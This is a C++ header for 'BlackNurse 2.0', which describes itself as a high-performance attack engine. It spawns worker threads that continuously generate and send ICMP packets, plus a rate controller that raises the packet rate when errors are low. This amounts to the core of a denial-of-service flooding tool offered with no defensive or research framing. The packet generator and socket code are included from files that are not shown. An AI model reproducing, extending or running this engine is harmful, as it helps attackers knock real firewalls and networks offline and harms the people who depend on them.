/**
 * BlackNurse 2.0 - Attack Engine
 * 
 * High-performance multi-threaded attack engine with adaptive rate control
 * and enhanced packet generation capabilities.
 */

#pragma once

#include <vector>
#include <thread>
#include <atomic>
#include <memory>
#include <chrono>
#include <random>
#include <mutex>
#include <condition_variable>
#include <queue>

#include "common/config.hpp"
#include "common/logger.hpp"
#include "network/packet_generator.hpp"
#include "network/socket_manager.hpp"

namespace blacknurse {

class AttackEngine {
public:
    explicit AttackEngine(const Config& config)
        : config_(config), running_(false), stats_() {
        
        // Validate configuration
        if (!config_.validate()) {
            throw std::invalid_argument("Invalid configuration");
        }
        
        // Auto-tune configuration
        config_.auto_tune();
        
        // Initialize packet generator
        packet_generator_ = std::make_unique<PacketGenerator>(config_);
        
        // Initialize socket manager
        socket_manager_ = std::make_unique<SocketManager>(config_);
        
        // Initialize random number generator
        rng_.seed(std::chrono::steady_clock::now().time_since_epoch().count());
        
        Logger::info("Attack engine initialized with " + std::to_string(config_.thread_count) + " threads");
    }
    
    ~AttackEngine() {
        stop();
    }
    
    void start() {
        if (running_.exchange(true)) {
            Logger::warning("Attack engine is already running");
            return;
        }
        
        stats_.reset();
        
        Logger::info("Starting attack threads...");
        
        // Create worker threads
        threads_.reserve(config_.thread_count);
        for (uint32_t i = 0; i < config_.thread_count; ++i) {
            threads_.emplace_back(&AttackEngine::worker_thread, this, i);
        }
        
        // Start rate controller thread
        rate_controller_thread_ = std::thread(&AttackEngine::rate_controller, this);
        
        Logger::info("Attack started successfully");
    }
    
    void stop() {
        if (!running_.exchange(false)) {
            return;
        }
        
        Logger::info("Stopping attack threads...");
        
        // Wake up all threads
        rate_cv_.notify_all();
        
        // Join all worker threads
        for (auto& thread : threads_) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        threads_.clear();
        
        // Join rate controller thread
        if (rate_controller_thread_.joinable()) {
            rate_controller_thread_.join();
        }
        
        Logger::info("All threads stopped");
    }
    
    AttackStats get_stats() const {
        std::lock_guard<std::mutex> lock(stats_mutex_);
        auto stats = stats_;
        stats.update_rates();
        return stats;
    }
    
    bool is_running() const {
        return running_.load();
    }
    
private:
    void worker_thread(uint32_t thread_id) {
        Logger::debug("Worker thread " + std::to_string(thread_id) + " started");
        
        // Thread-local variables
        std::random_device rd;
        std::mt19937 local_rng(rd());
        uint64_t local_packets_sent = 0;
        uint64_t local_bytes_sent = 0;
        uint64_t local_errors = 0;
        
        // Rate limiting variables
        auto last_rate_check = std::chrono::steady_clock::now();
        uint32_t packets_in_interval = 0;
        const auto rate_interval = std::chrono::milliseconds(100);
        const uint32_t max_packets_per_interval = (config_.packets_per_second / config_.thread_count) / 10;
        
        while (running_.load()) {
            try {
                // Rate limiting
                auto now = std::chrono::steady_clock::now();
                if (now - last_rate_check >= rate_interval) {
                    packets_in_interval = 0;
                    last_rate_check = now;
                }
                
                if (packets_in_interval >= max_packets_per_interval) {
                    std::this_thread::sleep_for(std::chrono::microseconds(100));
                    continue;
                }
                
                // Generate and send packet
                auto packet = packet_generator_->generate_icmp_packet(local_rng);
                
                if (socket_manager_->send_packet(packet)) {
                    local_packets_sent++;
                    local_bytes_sent += packet.size();
                    packets_in_interval++;
                } else {
                    local_errors++;
                }
                
                // Adaptive delay based on system load
                if (config_.adaptive_rate) {
                    auto delay = calculate_adaptive_delay(thread_id);
                    if (delay > std::chrono::microseconds(0)) {
                        std::this_thread::sleep_for(delay);
                    }
                }
                
            } catch (const std::exception& e) {
                Logger::error("Worker thread " + std::to_string(thread_id) + " error: " + e.what());
                local_errors++;
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
        }
        
        // Update global statistics
        {
            std::lock_guard<std::mutex> lock(stats_mutex_);
            stats_.packets_sent += local_packets_sent;
            stats_.bytes_sent += local_bytes_sent;
            stats_.errors += local_errors;
        }
        
        Logger::debug("Worker thread " + std::to_string(thread_id) + " finished. Sent: " + 
                     std::to_string(local_packets_sent) + " packets");
    }
    
    void rate_controller() {
        Logger::debug("Rate controller thread started");
        
        auto last_update = std::chrono::steady_clock::now();
        const auto update_interval = std::chrono::seconds(1);
        
        while (running_.load()) {
            std::unique_lock<std::mutex> lock(rate_mutex_);
            rate_cv_.wait_for(lock, update_interval, [this] { return !running_.load(); });
            
            if (!running_.load()) break;
            
            auto now = std::chrono::steady_clock::now();
            if (now - last_update >= update_interval) {
                update_rate_control();
                last_update = now;
            }
        }
        
        Logger::debug("Rate controller thread finished");
    }
    
    void update_rate_control() {
        if (!config_.adaptive_rate) return;
        
        std::lock_guard<std::mutex> lock(stats_mutex_);
        
        // Calculate current performance metrics
        auto current_stats = stats_;
        current_stats.update_rates();
        
        // Adjust rate based on error rate and system performance
        double error_rate = static_cast<double>(current_stats.errors) / 
                           std::max(1ULL, current_stats.packets_sent);
        
        if (error_rate > 0.1) { // More than 10% error rate
            // Reduce rate
            config_.packets_per_second = static_cast<uint32_t>(config_.packets_per_second * 0.9);
            Logger::debug("High error rate detected, reducing rate to " + 
                         std::to_string(config_.packets_per_second) + " pps");
        } else if (error_rate < 0.01 && current_stats.current_pps < config_.packets_per_second * 0.8) {
            // Increase rate
            config_.packets_per_second = static_cast<uint32_t>(config_.packets_per_second * 1.1);
            Logger::debug("Low error rate detected, increasing rate to " + 
                         std::to_string(config_.packets_per_second) + " pps");
        }
    }
    
    std::chrono::microseconds calculate_adaptive_delay(uint32_t thread_id) {
        // Simple adaptive delay based on thread ID and current load
        static thread_local auto last_check = std::chrono::steady_clock::now();
        static thread_local uint32_t consecutive_errors = 0;
        
        auto now = std::chrono::steady_clock::now();
        if (now - last_check > std::chrono::seconds(1)) {
            consecutive_errors = 0;
            last_check = now;
        }
        
        // Base delay
        uint32_t base_delay = 1000000 / (config_.packets_per_second / config_.thread_count);
        
        // Add jitter to avoid synchronization
        std::uniform_int_distribution<uint32_t> jitter_dist(0, base_delay / 10);
        uint32_t jitter = jitter_dist(rng_);
        
        return std::chrono::microseconds(base_delay + jitter);
    }
    
    Config config_;
    std::atomic<bool> running_;
    AttackStats stats_;
    mutable std::mutex stats_mutex_;
    
    std::vector<std::thread> threads_;
    std::thread rate_controller_thread_;
    
    std::mutex rate_mutex_;
    std::condition_variable rate_cv_;
    
    std::unique_ptr<PacketGenerator> packet_generator_;
    std::unique_ptr<SocketManager> socket_manager_;
    
    mutable std::mt19937 rng_;
};

} // namespace blacknurse